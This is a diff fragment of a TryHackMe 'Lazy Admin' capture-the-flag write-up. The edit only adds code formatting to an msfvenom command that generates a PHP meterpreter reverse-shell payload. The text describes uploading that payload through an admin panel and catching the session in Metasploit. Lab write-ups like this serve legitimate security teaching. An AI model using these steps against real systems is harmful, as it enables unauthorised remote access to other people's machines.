@@ -42,7 +42,7 @@ Now that we have gotten into the admin panel, it's time to look for a way to get
 
 ![upload](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/upload.png)
 
-We can create an reverse shell with the command msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php. That worked. Now we can go to ```<ip>/content/attachment/shell.php5``` and run the file while we try to catch the reverse shell. We can catch the reverse shell with metasploit (msfconsole). I used the payload php/meterpreter_reverse_tcp. Set the options LHOST <your ip> and LPORT <choosen port>.
+We can create an reverse shell with the command ```msfvenom -p php/meterpreter_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.php```. That worked. Now we can go to ```<ip>/content/attachment/shell.php5``` and run the file while we try to catch the reverse shell. We can catch the reverse shell with metasploit (msfconsole). I used the payload php/meterpreter_reverse_tcp. Set the options LHOST <your ip> and LPORT <choosen port>.
 
 ![msf](https://github.com/nicolai-h/tryhackme/blob/main/lazy_admin/images/msf.png)
 
